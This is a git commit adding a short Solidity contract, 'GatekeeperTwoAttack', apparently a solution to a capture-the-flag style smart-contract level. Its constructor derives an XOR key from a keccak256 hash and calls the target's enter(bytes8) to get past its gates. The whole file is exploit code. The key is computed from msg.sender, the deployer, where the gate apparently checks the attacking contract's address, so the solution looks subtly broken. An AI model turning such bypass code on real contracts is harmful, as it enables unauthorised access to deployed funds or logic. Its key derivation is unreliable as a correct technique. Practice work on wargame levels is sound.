c0aea9bd86d725d015b4c4d3e41470aed1ce02c0
JMariadlcs <jmariadelacruzsanchez@gmail.com>
2023-02-08 17:28:07 +0100

    Level15

---
+++ Level15/GatekeeperTwoAttack.sol
@@ -0,0 +1,10 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperTwoAttack {
+
+    constructor(address _gatekeeperTwoContractAddress) {
+        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))) ^ bytes8((type(uint64).max));
+        _gatekeeperTwoContractAddress.call(abi.encodeWithSignature("enter(bytes8)", key));
+    }
+}
